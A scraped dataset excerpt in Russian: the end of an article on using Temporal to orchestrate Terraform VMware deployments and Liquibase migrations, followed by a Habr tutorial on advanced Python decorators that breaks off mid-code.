Пример конвейера GitLab (.gitlab-ci.yml), который интегрируется с рабочим процессом Temporal для развертывания виртуальной машины VMware с использованием Terraform. Этот конвейер предполагает, что сервер Temporal и рабочий узел уже настроены, и использует предоставленный ранее рабочий процесс Temporal на основе Python.
stages:
  - setup
  - terraform-init
  - terraform-plan
  - terraform-apply
  - temporal-workflow

variables:
  TERRAFORM_DIR: ""terraform""
  TEMPORAL_TASK_QUEUE: ""vmware-task-queue""

setup-dependencies:
  stage: setup
  image: python:3.9
  script:
    - apt-get update && apt-get install -y terraform
    - pip install temporalio requests
  artifacts:
    paths:
      - $TERRAFORM_DIR

terraform-init:
  stage: terraform-init
  image: hashicorp/terraform:latest
  script:
    - cd $TERRAFORM_DIR
    - terraform init
  artifacts:
    paths:
      - $TERRAFORM_DIR/.terraform

terraform-plan:
  stage: terraform-plan
  image: hashicorp/terraform:latest
  script:
    - cd $TERRAFORM_DIR
    - terraform plan -out=tfplan
  dependencies:
    - terraform-init
  artifacts:
    paths:
      - $TERRAFORM_DIR/tfplan

terraform-apply:
  stage: terraform-apply
  image: hashicorp/terraform:latest
  script:
    - cd $TERRAFORM_DIR
    - terraform apply -auto-approve tfplan
  dependencies:
    - terraform-plan

temporal-workflow:
  stage: temporal-workflow
  image: python:3.9
  script:
    - apt-get update && apt-get install -y git
    - pip install temporalio requests
    - git clone https://github.com/your-repo/temporal-vmware-workflow.git 
    - cd temporal-vmware-workflow
    - python run_workflow.py --task-queue $TEMPORAL_TASK_QUEUE --terraform-dir $TERRAFORM_DIR
  dependencies:
    - terraform-apply
Рабочий процесс на основе Temporal для развертывания виртуальных машин VMware с использованием Terraform является гораздо более гибким, чем традиционные настройки Terraform. В отличие от простого Terraform, который ограничен только предоставлением ресурсов, Temporal выступает в роли уровня оркестрации, который может легко интегрироваться с внешними системами, такими как инструменты мониторинга, CMDB и другие сервисы. Например, после того как Terraform предоставляет виртуальную машину, рабочий процесс может автоматически обновить CMDB, запустить проверку состояния в системе мониторинга или отправить уведомления заинтересованным сторонам.
Temporal также эффективно обрабатывает повторные попытки и сбои, гарантируя, что рабочий процесс продолжится даже в случае сбоя на этапе, таком как обновление CMDB. Он поддерживает динамическое принятие решений, например, запрос к системе мониторинга для определения, следует ли продолжать выполнение, и может приостановить выполнение для получения одобрения человека, если это необходимо. Это делает его идеальным для сложных реальных сценариев, где развертывание инфраструктуры не ограничивается только предоставлением ресурсов — оно включает бесшовную интеграцию с множеством инструментов и процессов.
@activity.defn
async def run_terraform_init(working_dir: str) -> str:
    result = subprocess.run([""terraform"", ""init""], cwd=working_dir, capture_output=True, text=True)
    if result.returncode != 0:
        raise Exception(f""Terraform init failed: {result.stderr}"")
    return result.stdout
...
@activity.defn
async def run_terraform_apply(working_dir: str) -> str:
    result = subprocess.run([""terraform"", ""apply"", ""-auto-approve"", ""tfplan""], cwd=working_dir, capture_output=True, text=True)
    if result.returncode != 0:
        raise Exception(f""Terraform apply failed: {result.stderr}"")
    return result.stdout
...
Миграции баз данных
Крупные миграции баз данных, особенно для производственных систем с объемом данных 500 ГБ или более, могут быть невероятно сложными и рискованными. Инструменты вроде Liquibase отлично подходят для управления изменениями схемы и версионирования, но когда дело доходит до надежного выполнения этих миграций — особенно в распределенных или гибридных средах — они часто не справляются самостоятельно. Именно здесь Temporal демонстрирует свои преимущества.
Temporal добавляет уровень оркестрации, который гарантирует плавное выполнение миграций, даже для огромных баз данных. Например, миграция производственной базы данных объемом более 500 ГБ может включать такие шаги, как резервное копирование данных, применение изменений схемы, проверку миграции и откат, если что-то пойдет не так. Temporal координирует эти шаги, автоматически повторяет выполнение проваленных задач и отслеживает прогресс, чтобы избежать перезапуска процесса в случае его прерывания.
Он также идеально подходит для обработки длительных операций, которые могут занять часы или даже дни. Если во время миграции возникнет проблема — например, сбой сети или скачок нагрузки на базу данных — Temporal может приостановить рабочий процесс и возобновить его, когда условия улучшатся. А поскольку реальные миграции часто требуют участия человека, Temporal может приостановить выполнение для получения одобрения перед внесением критических изменений, таких как изменение схемы в производственной среде, и продолжить после получения разрешения.
Интеграция с инструментами мониторинга, системами резервного копирования и другими внешними сервисами позволяет Temporal гарантировать, что все остается синхронизированным на протяжении всей миграции. Независимо от того, перемещаете ли вы терабайты данных между регионами или применяете деликатные обновления схемы в работающей системе, Temporal заполняет пробел между возможностями Liquibase и операционной сложностью современного управления базами данных.
Ниже представлен один файл на языке Go, который реализует рабочий процесс Temporal для оркестрации миграции схемы базы данных с использованием Liquibase.
// Activity: Backup the database
func BackupDatabase(ctx context.Context, databaseURL string) error {
    cmd := exec.CommandContext(ctx, ""pg_dump"", ""-Fc"", ""-f"", ""/backups/db_backup.dump"", databaseURL)
    if err := cmd.Run(); err != nil {
        return fmt.Errorf(""failed to execute backup command: %w"", err)
    }
    return nil
}

// Activity: Run Liquibase update
type LiquibaseInput struct {
    DatabaseURL   string
    ChangelogFile string
}

func RunLiquibaseUpdate(ctx context.Context, input LiquibaseInput) error {
    cmd := exec.CommandContext(ctx, ""liquibase"", ""--url"", input.DatabaseURL, ""--changeLogFile"", input.ChangelogFile, ""update"")
    if err := cmd.Run(); err != nil {
        return fmt.Errorf(""liquibase update failed: %w"", err)
    }
    return nil
}

// Activity: Validate the migration
func ValidateMigration(ctx context.Context, databaseURL string) error {
    // Example: Run a query to check if the schema is applied correctly
    cmd := exec.CommandContext(ctx, ""psql"", ""-c"", ""SELECT * FROM information_schema.tables WHERE table_schema = 'public';"", databaseURL)
    if err := cmd.Run(); err != nil {
        return fmt.Errorf(""validation query failed: %w"", err)
    }
    return nil
}
Самообслуживание (self-service) с использованием Temporal
Предоставление безопасной самообслуживаемой инфраструктуры для разработчиков в крупных организациях является сложной задачей. Традиционные подходы часто требуют создания пользовательских инструментов или поддержки сложных провайдеров Terraform для каждого сервиса.
Более простая альтернатива заключается в оркестрации существующих REST API (Keycloak, Vault и т. д.) через рабочие процессы Temporal. Этот подход:
Устраняет необходимость в пользовательских провайдерах Terraform или внутренних инструментах
Использует нативные API целевых систем, таких как Vault, для управления пространствами имен и AppRole
Обеспечивает безопасность за счет встроенных рабочих процессов утверждений и аудитных журналов
Масштабируется между командами без создания технического долга из-за фрагментированных решений
Temporal управляет оркестрацией, повторными попытками и состоянием, взаимодействуя напрямую с API каждой системы. Это снижает накладные расходы на обслуживание по сравнению с управлением множеством провайдеров Terraform или пользовательских сервисов.
Послесловие
Temporal выступает в роли хореографа, координируя взаимодействие между Ansible и Terraform для создания более гибких и отказоустойчивых рабочих процессов. В то время как Terraform предоставляет инфраструктуру через декларативные манифесты, а Ansible управляет конфигурацией систем, Temporal обеспечивает надежную оркестрацию этих процессов, добавляя такие возможности, как автоматические повторные попытки, точки контроля состояния и динамическое принятие решений. Это позволяет объединить разрозненные задачи в единую цепочку, где каждый инструмент выполняет свою роль, а Temporal гарантирует целостность и завершенность всего процесса, даже в случае сбоев или длительных операций."
Продвинутое использование декораторов Python,https://habr.com/ru/articles/910424/,"Привет, Хабр! продолжаю цикл статей про python разработку.
В данной статье продолжаю материал прошлой и хочу углубиться в тему декораторов, показать относительно сложные, но применимые в реальной прак...","Привет, Хабр! продолжаю цикл статей про python разработку.
В данной статье продолжаю материал прошлой и хочу углубиться в тему декораторов, показать относительно сложные, но применимые в реальной практике примеры использования декораторов, дам небольшую теоретическую базу и некоторое количество ссылок на полезные материалы по теме. Думаю, последние разделы статьи будут полезны даже для опытных разработчиков.

Как обычно буду очень рад критике и предложениям по улучшению материала.
ПЕРЕМЕСТИТЬСЯ К ОГЛАВЛЕНИЮ
В прошлой статье мы:
Рассмотрели простейшие варианты использования декораторов;
Немного коснулись темы замыкания;
Рассмотрели обычные декораторы;
Декораторы с параметрами;
Декораторы принимающие аргументы;
Но обошлись без примеров использования и практической ценности.
Также хочу обратить внимание на хорошую статью про декораторы, которая является достаточно емкой в своем содержании и также может помочь в ознакомлении с текущей.

Помимо прочего в ней рассмотрены примеры аннотирования декораторов, что может быть многим полезно. В данной статье эта тема не будет рассмотрена, так как, на мой взгляд, данный раздел несколько выбивается из основного контекста статьи.
На самом деле, область применения декораторов ограничивается лишь фантазией и некоторыми нюансами языка в целом и его синтаксиса, однако, целесообразность, на мой взгляд, важнее возможности использовать тот или иной паттерн.

Приведу некоторые примеры когда применение декораторов имеет смысл списком, чтобы не было необходимости проваливаться в статьи:
Оптимизация производительности функций (кэширование);
Тайминг и профилирование (измерение времени выполнения функции, проверки производительности);
Авторизация и аутентификация (проверки по типу login_required);
Логирование;
Подавление и обработка исключений;
Регистрация объектов;
Создание объектов;
Добавление / изменение атрибутов объектов;
Валидация.
Вот несколько статей на тему:
docs-python;
realpython.
В статье не будут рассмотрены декораторы для работы с авторизацией и аутентификации, поэтому просто оставлю ссылки на примеры django, flask
Просмотрев реальные примеры использования декораторов мы можем сразу же сделать вывод, что одной из главных (но не единственной) ценностей паттерна является инкапсуляция некоторого количество строк кода, которые нам необходимо неоднократно использовать сводя их определение при помощи синтаксического сахара в виде знака @ до упоминания имени функции.
Для большинства задач конечно же достаточно простейших декораторов, которые просто:
Выполняют часть кода до вызова функции (используя или нет её аргументы);
Выполняют часть кода после вызова функции (используя или нет её аргументы и результат);
Обрабатывают исключения;
Вызывают функцию в контексте какого-либо контекстного менеджера;
Модифицируют функцию или любой другой объект, переданный в декоратор;
Используют комбинацию выше указанных действий.
В данной статье я хочу показать насколько мощным и эстетичным инструментом являются декораторы в python.
По большей части хочется осветить именно особенности декораторов в языке, но также буду стараться демонстрировать реальные примеры использования и расскажу для чего это может быть нужно.
В контексте данной статьи я не буду рассматривать декораторы асинхронных функций или возможность работы с обоими вариантами в виду того, что значительных различий в реализации не будет, но объем статьи из-за этого может значительно увеличиться.
Мы поговорим с вами о следующих темах
Регистрация объектов
Вложенные декораторы
Декорирование классов
Особенности декорирования методов классов
Декораторы как классы
Наследование классов декораторов
Работа с сигнатурой функции
Заключение
Регистрация объектов
Один из самых частых примеров использования декоратора, он используется для регистрации чего угодно, например ошибок, сессий, моделей orm, логгеров или любых других описанных классов и не только.
Приведу минимально жизнеспособный пример.
Импорты из примеров









_registry = []

def register(obj: Any):
    # просто добавляем декорируемый объект в список _registry
    _registry.append(obj)
    # возвращаем декорируемый объект
    return obj


@register
class Foo:
    pass


# проверяем что _registry содержит объект класса Foo
# _registry
# [<class '__main__.Foo'>]
Мы также можем описать логику, которая будет регистрировать объекты например в словарь или в различные словари в зависимости от класса или любого другого свойства которым обладает объект, передающийся в функцию register. Мы можем модифицировать декоратор так, чтобы он принимал аргументы и на их основе как угодно усложнять логику регистрации, также можно дописать логику, благодаря которой уже зарегистрированный объект не будет регистрироваться повторно или будет увеличивать тот или иной счетчик, также можно вызывать исключение при попытке повторной регистрации одного и того же объекта. В общем вы можете усложнять логику сколько угодно для того чтобы она удовлетворяла потребностям вашей задачи.

Пример из практики: добавление модели в административную панель django
from django.contrib import admin

# Для класса модели django регистрируем класс раздела в административной панели
@admin.register(ModelClass)
class ModelAdminClass(admin.ModelAdmin):
    pass
Оригинальный код декоратора






















Здесь мы видим декоратор admin.register, принимающий аргументы. В примере мы передаем класс модели ModelClass для которой мы хотим добавить раздел в административной панели.
Вызов admin.register(ModelClass) возвращает нам приватную функцию _model_admin_wrapper, определенную внутри функции admin.register, которая в свою очередь вызывается, принимая в качестве аргумента объект класса ModelAdminClass.
Важно отметить, что переданный в функцию admin.register позиционный аргумент ModelClass доступен в области видимости функции _model_admin_wrapper как кортеж models = (ModelClass, ) (данное поведение обусловлено особенностями распаковки аргументов функций в python).
# если бы мы сделали что-то вроде
admin_decorator = admin.register(ModelClass)

# технически мы могли бы вызвать полученный декоратор 
# неограниченное количество раз, например так

@admin_decorator
class ModelAdminClass(admin.ModelAdmin):
    pass

@admin_decorator
class OtherModelAdminClass(admin.ModelAdmin):
    pass
Результатом выполнения функции admin.register является все тот же класс ModelAdminClass, который был передан как аргумент функции _model_admin_wrapper. Таким образом при обращении к ModelAdminClass мы получим тот же класс, который мы объявили, но ""под капотом"" код django проведет все необходимые манипуляции для того, чтобы раздел с вашей моделью появился в административной панели.
Вложенные декораторы
Говоря о вложенности декораторов мы можем рассмотреть 3 различных варианта:
Используем последовательно некоторое количество декораторов;
Объявляем один декоратор внутри другого;
Объявляем тот или иной объект, атрибут(ом/ами) которого является декоратор.
Самым часто используемым, конечно, является первый вариант.
Вот минимальный жизнеспособный пример.
def multiply_two(function):
    def wrapper(value):
        return function(value) * 2
    return wrapper


def minus_one(function):
    def wrapper(value):
        return function(value) - 1
    return wrapper


@minus_one
@multiply_two
def some_function(value):
    return value

# some_function(2)
# 3
О порядке выполнения и декорирования я уже рассказывал в прошлой статье, поэтому тут останавливаться не будем.
В целом преимущество такого использования заключается в том, что мы можем свободно расширять или модифицировать функционал, любой необходимой логикой, инкапсулированной в декорирующих функциях.
Это может быть необходимо, например, если мы хотим проверить авторизован ли пользователь, превышено ли допустимое количество запросов, записать лог запроса, провалидировать результат и преобразовать его в ответ в требуемом формате.
Пример того как это могло бы выглядеть.
@record_log
@rate_limit_control
@login_required
@prepare_response
@validate_result
def some_action(request):
    # do something
    return
Во втором варианте, мы объявляем один декоратор внутри другого.
Вот минимальный пример.
Для справки статья про контекстные менеджеры
def manager_decorator(manager) -> Callable:
    # принимаем функцию, которая возвращает контекстный менеджер
    @wraps(manager)
    def manager_wrapper(*manager_args, **manager_kwargs):
        # здесь мы ""запоминаем"" аргументы, адресованные контекстному
        # менеджеру для дальнейшего использования
        def nested_decorator(function):
            # оборачиваем декорируемую функцию
            @wraps(function)
            def wrapper(*args, **kwargs):
                # объявляем контекст
                with manager(*manager_args, **manager_kwargs) as context:
                    # передаем контекст первым аргументом в вызов декорируемой
                    # функции и возвращаем результат
                    return function(context, *args, **kwargs)

            # возвращаем целевую функцию, которая нас и интересует
            return wrapper

        # возвращаем вложенный декоратор
        return nested_decorator

    # возвращаем уже известный нам декоратор, принимающий аргументы
    return manager_wrapper
Пример использования:
# НЕ ПОВТОРЯЙТЕ ЭТО ДОМА!!!
# Тут мы декорируем функцию объемлющим декоратором
@manager_decorator
def with_open(*args, **kwargs):
    # do something
    return open(*args, **kwargs)


# Вызывая with_open передаем атрибуты, которые далее 
# будут переданы в open при объявлении контекста
# и декорируем функцию вложенным декоратором
@with_open('some.txt', 'r')
def print_text(file):
    print(file.readlines())


# print_text()
# ['Кокой-то текст из файла']
Данный пример мягко говоря является ""экзотическим"" я бы рекомендовал избегать подобного рода конструкций. Хоть на моей практике и были примеры, когда такого вида решение казалось элегантнее альтернатив, уверяю вас, почти в 100% случаев это будет избыточностью, которую в добавок сложнее поддерживать.
Одним из действительно целесообразных примеров использования вложенных декораторов является поведение встроенного декоратора property в случаях, когда мы хотим иметь возможность изменять значение атрибута.
class Foo:
    _attr = 1

    # Объявляем свойство, которое будет возвращать значение атрибута _attr
    @property
    def attr(self):
        return self._attr

    # Объявляем функцию, которая будет изменять значение атрибута _attr
    @attr.setter
    def attr(self, value):
        self._attr = value

# Проверяем, что мы действительно получаем значение атрибута _attr
# foo = Foo()
# foo.attr
# 1

# Присваеваем значение 2 атрибуту _attr
# foo.attr = 2

# Проверяем, корректно ли изменилось значение
# foo._attr
# 2
# foo.attr
# 2
В целом выше указанный пример объединяет в себе второй и третий подход, но давайте попробуем самостоятельно написать класс, атрибуты которого являются декораторами.
Данный вариант также имеет смысл, когда в зависимости от одних и тех же входных параметром мы хотим сразу же уметь делать несколько вещей, например, у нас есть какой-то логгер и нам нужно делать запись перед выполнением функции, после выполнения функции или до и после.
class LoggerDecorator:
    _logger: logging.Logger
    _before_text: str
    _after_text: str

    def __init__(
        self,
        logger: logging.Logger,
        before_text: str = ""Время перед выполнением: {}"",
        after_text: str = ""Время после выполнения: {}"",
    ):
        # Записываем переданные аргументы в атрибуты класса
        # для дальнейшего использования в декораторах
        self._logger = logger
        self._before_text = before_text
        self._after_text = after_text

    # Объявляем метод, который будет записывать лог перед выполнением функции
    def before(self, function: Callable):
        @wraps(function)
        def wrapper(*args, **kwargs):
            # Записываем лог
            self._logger.debug(self._before_text.format(time.time()))
            # Возвращаем результат функции
            return function(*args, **kwargs)
        return wrapper

    # Объявляем метод, который будет записывать лог после выполнением функции
    def after(self, function: Callable):
        @wraps(function)
        def wrapper(*args, **kwargs):
            # Записываем результат функции
            result = function(*args, **kwargs)
            # Записываем лог
            self._logger.debug(self._after_text.format(time.time()))
            # Возвращаем результат функции
            return result
        return wrapper

# Получаем текущий логгер
_logger = logging.getLogger(__name__)
# Устанавливаем уровень, начиная с которого логгер будет регистрировать записи
_logger.setLevel(logging.DEBUG)
# Создаем инстанс класса с нашими декораторами
logger_decorator = LoggerDecorator(_logger)
Пример использования:
# Перед выполнением этой функции будет записываться лог
@logger_decorator.before
def with_log_before():
    print(""Выполнение функции"")

# with_log_before()
# DEBUG:__main__:Время перед выполнением: 1747424614.7285378
# Выполнение функции

# После выполнением этой функции будет записываться лог
@logger_decorator.after
def with_log_after():
    print(""Выполнение функции"")

# with_log_after()
# Выполнение функции
# DEBUG:__main__:Время после выполнения: 1747424628.5622175

# И перед и после выполнением этой функции будет записываться лог
@logger_decorator.before
@logger_decorator.after
def with_log_before_and_after():
    print(""Выполнение функции"", time.time())

# with_log_before_and_after()
# Выполнение функции 1747425047.5508897
# DEBUG:__main__:Время перед выполнением: 1747425047.5508294
# DEBUG:__main__:Время после выполнения: 1747425047.5508966
Данный способ определения декораторов позволяет сократить количество определяемых вами сущностей, однако не стоит забывать о том, что объекты подобные LoggerDecorator не должны содержать разнородный функционал.
Это не обязательно должно быть выполнение до и после, это могут быть, например, математические операции или методы авторизации или любой другой функционал, сгруппированный по тому или иному но единственному общему признаку.
Декорирование классов
Сразу приведу классический пример:
@dataclass
class FooDTO:
    first_field: str
    second_field: int


# dto = FooDTO(first_field=""foo"", second_field=1)
# dto.first_field
# 'foo'
# dto.second_field
# 1
Думаю, все согласятся, что это как минимум удобно.
В реализации dataclass лежит потрясающая, но ""черная магия"". Грубо говоря класс в значительной степени модифицируется вызовом функции dataclass, что позволяет записывать значения атрибутов класса не объявляя метод __init__, что в свою очередь экономит значительное количество времени.
Написание декораторов классов на практике линейного разработчика чаще всего сводится к тому, что класс либо необходимо где-то зарегистрировать, либо нужно реализовать singleton, либо необходимо определить или переопределить несколько атрибутов.
Для того, чтобы написать декоратор сравнимо с dataclass модифицирующий объект придется выйти далеко за рамки данной статьи, поэтому я приведу пару коротких примеров написания декоратора для класса, чтобы у вас было представление о том, как это может выглядеть.
Важно понимать, что для декорирующей функции не имеет никакого значения, какой объект в нее передавать, если только не указано обратное.
Минимальный пример:
def set_class_attr(name: str, value: Any):
    # Данные декоратор будет присваивать значения атрибутам объекта класса
    def wrapper(cls):
        # Просто определяем переданный атрибут класса
        setattr(cls, name, value)
        # Возвращаем исходный класс.
        # Тут важно понимать, что хоть мы и модифицируем класс ""на месте"", 
        # значению атрибута модуля с именем, соответствующем имени класса,
        # будет присвоено значение равное результату вызова wrapper
        return cls
    return wrapper


@set_class_attr(""first_field"", 1)
@set_class_attr(""second_field"", 2)
class Foo:
    pass


# Проверяем, что класс имеет присвоенные в декораторах атрибуты
# Foo.first_field
# 1
# Foo.second_field
# 2
Часто бывает необходимо модифицировать не сам класс а его экземпляры, для этого, можно повесить декоратор на методы __new__ или __init__ или же полностью их заменить.
Опять же, все это в подавляющем большинстве неявные изменения, что чаще всего может быть больше во вред чем в пользу, поэтому вы должны точно знать что конкретно вы делаете, зачем и нельзя ли сделать иначе.
Для справки статья про ""магические методы""
Пример декоратора, модифицирующего экземпляры класса:
def set_instance_attr(name: str, value_factory: Callable):
    # Данный декоратор, будет присваивать значения атрибутам экземпляров класса
    def wrapper(cls):
        # Просто определяем переданный атрибут класса

        # Записываем оригинальный __init__ метод
        __old__init__ = cls.__init__

        # Определяем новый __init__ метод
        def __new_init__(self, *args, **kwargs):
            # Просто присваиваем значение переданному атрибуту
            setattr(self, name, value_factory())
            # Вызываем оригинальный __init__ метод
            __old__init__(self, *args, **kwargs)

        # Подменяем __init__ метод класса
        cls.__init__ = __new_init__
        # Возвращаем исходный класс
        return cls
    return wrapper
Пример использования:
# Данный декоратор добавит поле field со значением [] для каждого 
# экземпляра класса, сам класс этим атрибутом обладать не будет
@set_instance_attr(""field"", list)
class Foo:
    pass

# hasattr(Foo, ""field"")
# False

# Создаем экземпляры класса
first_instance = Foo()
second_instance = Foo()

# Проверяем, что значения поля в каждом экземпляре не ссылаются 
# на один и тот же список
first_instance.field.append(1)
second_instance.field.append(2)

# first_instance.field
# [1]
# second_instance.field
# [2]
Еще раз хочу акцентировать внимание на том, что подобного рода подходы являются неявными, усложняют поддержку и увеличивают сложность кода.
Сам я допускаю их применение только для изолированного в себе функционала, полностью покрытого тестами, с крайне малой вероятностью требующего модификацию в дальнейшем, а главное, позволяющего значительно сократить время разработки в случае его использования.
Особенности декорирования методов классов
Если вы когда-то пытались написать универсальный декоратор для функции, метода экземпляра класса, метода класса и статического метода, думаю, вы знаете, что есть ряд трудностей, связанных с передачей аргументов.
Представим, что мы хотим выводить в консоль второй передаваемый в вызов позиционный аргумент внутри декоратора. Понимаю, задача достаточно абстрактная, но думаю, каждый сталкивался с тем, что его интересовали параметры self, cls или какой либо еще позиционный аргумент внутри написанного вами декоратора.
Реализуем описанный выше декоратор.
def decorator(function):
    @wraps(function)
    def wrapper(*args, **kwargs):
        print(""Второй позиционный аргумент в декораторе"", args[1])
        return  function(*args, **kwargs)
    return wrapper
Теперь напишем пример объектов, с которыми нам предстоит работать.
@decorator
def foo(*args, **kwargs):
    print(""Аргументы функции"", args, kwargs)


class FooClass:
    @decorator
    def method(self, *args, **kwargs):
        print(""Аргументы функции"", self, args, kwargs)

    @classmethod
    @decorator
    def class_method(cls, *args, **kwargs):
        print(""Аргументы функции"", cls, args, kwargs)

    @staticmethod
    @decorator
    def static_method(*args, **kwargs):
        print(""Аргументы функции"", args, kwargs)

foo_instance = FooClass()
Допустим, что мы всегда имеем валидные данные и не будем утруждать себя разного рода проверками и работой с inspect. Просто попробуем выполнить каждую функцию.
foo(1, 2)
# Второй позиционный аргумент в декораторе 2
# Аргументы функции (1, 2) {}
# Тут мы имеем ожидаемое поведение

FooClass.class_method(1, 2)
# Второй позиционный аргумент в декораторе 1
# Аргументы функции <class '__main__.FooClass'> (1, 2) {}
# С методом класса это не работает

FooClass.static_method(1, 2)
# Второй позиционный аргумент в декораторе 2
# Аргументы функции (1, 2) {}
# Статический метод по факту функция, поэтому проблем с ним нет

foo_instance.method(1, 2)
# Второй позиционный аргумент в декораторе 1
# Аргументы функции <__main__.FooClass object at 0x72efab2423c0> (1, 2) {}
# С методом экземпляра это также не работает
Есть несколько вариантов того, как мы можем решить эту проблему.
Мы можем явно обозначить, что декорируем метод класса или экземпляра, доработав декоратор так, чтобы он принимал аргументы.
def decorator(
    _function: Callable | None = None,
    /,
    class_method: bool = False
):
    def _decorator(function):
        @wraps(function)
        def wrapper(*args, **kwargs):
            # Если указано, что декорируется метод класса,
            # нас интересует индекс 2 иначе 1
            second_arg_index = 2 if class_method else 1
            print(
              ""Второй позиционный аргумент в декораторе"", 
              args[second_arg_index]
            )
            return  function(*args, **kwargs)
        return wrapper

    # Если decorator вызван без параметров, то сразу декорируем функцию
    if _function:
        return _decorator(_function)
    return _decorator
Проверяем, что теперь все работает корректно.
class FooClass:
    @decorator(class_method=True)
    def method(self, *args, **kwargs):
        print(""Аргументы функции"", self, args, kwargs)

    @classmethod
    @decorator(class_method=True)
    def class_method(cls, *args, **kwargs):
        print(""Аргументы функции"", cls, args, kwargs)

foo_instance = FooClass()

# Проверяем, что все верно
FooClass.class_method(1, 2)
# Второй позиционный аргумент в декораторе 2
# Аргументы функции <class '__main__.FooClass'> (1, 2) {}
# Получаем ожидаемое значение

foo_instance.method(1, 2)
# Второй позиционный аргумент в декораторе 2
# Аргументы функции <__main__.FooClass object at 0x72efab242660> (1, 2) {}
# Получаем ожидаемое значение
Думаю, вы согласитесь, что не хочется каждый раз, передавать аргумент class_method, учитывая, что и так понятно, что мы декорируем метод класса.
К сожалению, на этапе декорирования функции у самой функции декоратора нет почти никакой возможности узнать, что она декорирует: обычную функцию, метод класса, метод экземпляра класса или статический метод.
Конечно можно использовать модуль inspect или как-то иначе проверить имя первого аргумента, например искать self, cls, mcs или что-то еще, но это не гарантирует нам ожидаемого поведения в 100% случаев.
Для решения данной проблемы целесообразнее использовать класс, который будет выполнять роль декоратора.
Декораторы как классы
Для определения такого рода декораторов, в некоторой мере нужно познакомиться с дескрипторами.
Если кратко, то дескрипторы, это классы, у которых определены один или несколько ""магических методов"" из следующего списка __get__, __set__, __delete__, в какой-то мере сюда же можно отнести метод __set_name__.
Такие классы переопределяют поведение получения, присвоения или удаления атрибутов экземпляра класса, значением которых является класс дескриптора.
Давайте попробуем написать класс декоратора, который будет работать для всех вариантов без передачи дополнительных параметров.
Важно отметить, что если вы работаете с inspect или проверяете типы вызываемых атрибутов, то текущий класс необходимо доработать для имитации поведения обычных функций (например, для Pydantic вам потребуется добавить класс дескриптора в ignored_types), помимо этого стоит учесть, что многие инструменты используют inspect.unwrap, это тоже стоит учесть при доработке. Также, в зависимости от способа получения атрибутов, может понадобится доработка, если вы используете методы экземпляров классов напрямую из класса или через super.
class Decorator:
    _function: Callable

    def __init__(self, function: Callable):
        # Записываем декорируемую функцию в атрибут класса дескриптора
        self._function = function

    def __call__(self, *args, __bind_self: bool = False, **kwargs):
        # Если был передан __bind_self со значением True, то мы имеем
        # дело с методом инстанса класса
        # Если self._is_method(args[0]), то мы имеем дело с classmethod
        # Если указано, что декорируется метод класса, 
        # нас интересует индекс 2 иначе 1
        is_bind = __bind_self or args and self._is_method(args[0])
        second_arg_index = (2 if is_bind else 1)
        print(
          ""Второй позиционный аргумент в декораторе"",
          args[second_arg_index]
        )
        # Возвращаем результат выполнения функции
        return self._function(*args, **kwargs)

    def __get__(self, instance, owner):
        # При обращении к декорируемым методам инстанса класса, 
        # будет вызываться данная функция
        # functools.partial принимает функцию, которую нужно 
        # будет вызвать и часть аргументов, которые ей будут переданы
        # на данном этапе сама функция вызвана не будет
        return functools.partial(
            self.__call__,
            instance, 
            # аргумент _Decorator__bind_self имеет такой вид
            # из-за особенности реализации передачи приватных аргументов
            _Decorator__bind_self=instance is not None
        )

    def _is_method(self, arg):
        # Проверяем имеет ли аргумент атрибут с именем декорируемой функции
        attr = getattr(arg, self._function.__name__, None)
        # Проверяем являются ли функции в объекте и декорируемая
        # функция одним и тем же объектом
        return getattr(attr, ""_function"", None) is self._function
Заново определяем объекты, с которыми будем работать.
@Decorator
def foo(*args, **kwargs):
    print(""Аргументы функции"", args, kwargs)


class FooClass:
    @Decorator
    def method(self, *args, **kwargs):
        print(""Аргументы функции"", self, args, kwargs)

    @classmethod
    @Decorator
    def class_method(cls, *args, **kwargs):
        print(""Аргументы функции"", cls, args, kwargs)

    @staticmethod
    @Decorator
    def static_method(*args, **kwargs):
        print(""Аргументы функции"", args, kwargs)

foo_instance = FooClass()
Проверяем, во всех ли случаях мы получаем ожидаемый результат.
foo(1, 2)
# Второй позиционный аргумент в декораторе 2
# Аргументы функции (1, 2) {}
# Получаем ожидаемое значение

FooClass.class_method(1, 2)
# Второй позиционный аргумент в декораторе 2
# Аргументы функции <class '__main__.FooClass'> (1, 2) {}
# Получаем ожидаемое значение

FooClass.static_method(1, 2)
# Второй позиционный аргумент в декораторе 2
# Аргументы функции (1, 2) {}
# Получаем ожидаемое значение

foo_instance.method(1, 2)
# Второй позиционный аргумент в декораторе 2
# Аргументы функции <__main__.FooClass object at 0x703b09a63b60> (1, 2) {}
# Получаем ожидаемое значение
Наследование классов декораторов
Решение прошлого кейса выглядит достаточно громоздким, и вряд ли кто-то захочет писать это для каждого декоратора. Так как теперь мы работаем с классом давайте приведем его к виду, в котором его можно было бы удобно расширять.
Немного перепишем структуру класса.
# Добавим enum для определения того, что именно было прокинуто в вызов функции
class _BindTypes(enum.Enum):
    SELF = enum.auto()
    CLS = enum.auto()


class BaseDecorator:
    _function: Callable

    def __init__(self, function: Callable):
        self._function = function

    def __call__(
      self, 
      *args,
      __bind_type: _BindTypes | None = None,
      **kwargs
    ):
        # Если не был передан инстанс класса, то проверяем, 
        # является ли функция методом класса
        if not __bind_type and args and self._is_method(args[0]):
            __bind_type = _BindTypes.CLS

        # Если передан инстанс класса и определена реализация для 
        # этого типа вызова, вызываем соответствующий метод
        if __bind_type == _BindTypes.SELF and hasattr(self, ""_self_bind_call""):
            return self._self_bind_call(*args, **kwargs)
        # Если передан объект класса и определена реализация для
        # этого типа вызова, вызываем соответствующий метод
        if __bind_type == _BindTypes.CLS and hasattr(self, ""_cls_bind_call""):
            return self._cls_bind_call(*args, **kwargs)

        # Для кейсов, не имеющих определенных реализаций, вызываем общий метод
        return self._call(*args, **kwargs)

    def __get__(self, instance, owner):
        bind_type = _BindTypes.SELF if instance is not None else None
        return functools.partial(
            self.__call__,
            instance, 
            _BaseDecorator__bind_type=bind_type
        )

    def _is_method(self, arg):
        attr = getattr(arg, self._function.__name__, None)
        return getattr(attr, ""_function"", None) is self._function

    def _call(self, *args, **kwargs):
        """"""Общий метод для вызова декорируемой функции""""""
        raise NotImplemented

    # Объявляем функции только на этапе проверки типов,
    # чтобы не определять реализации без необходимости
    if TYPE_CHECKING:
        def _cls_bind_call(self, owner, *args, **kwargs):
            """"""Метод для работы с вызовом методов класса""""""

        def _self_bind_call(self, instance, *args, **kwargs):
            """"""Метод для работы с вызовом методов инстанса класса""""""
Теперь мы можем наследоваться от базового класса и определять любую необходимую логику, в том числе в зависимости от того с каким именно методом мы работаем.
Пример использования:
class FooDecorator(BaseDecorator):
